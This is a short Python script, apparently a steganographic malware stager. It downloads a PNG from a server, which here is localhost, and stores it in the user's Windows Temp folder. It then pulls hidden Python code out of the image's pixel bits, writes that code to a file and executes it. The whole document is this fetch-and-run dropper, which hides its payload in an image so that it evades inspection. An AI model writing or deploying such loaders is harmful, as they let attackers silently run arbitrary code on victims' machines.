import os, requests, subprocess
from stegano import lsb

def extract_data(image_path):
    code = lsb.reveal(image_path)
    return code

def write_code(code, file_path):
    with open(file_path, 'w') as py_file:
        py_file.write(code)


def execute_script(file_path):
    subprocess.run(["py", file_path])

# ///////////////////////////////////////////////////////////////////////////////////////

image_path = os.path.join(os.path.expanduser("~"), 'AppData','Local', 'Temp', 'image.png')

file_path = os.path.join(os.path.expanduser("~"), 'AppData','Local', 'Temp', 'script.py')

response = requests.get(url='http://127.0.0.1:5000/get/image')

with open(image_path, 'wb') as img_file:
    img_file.write(response.content)

code = extract_data(image_path)

write_code(code, file_path)

execute_script(file_path)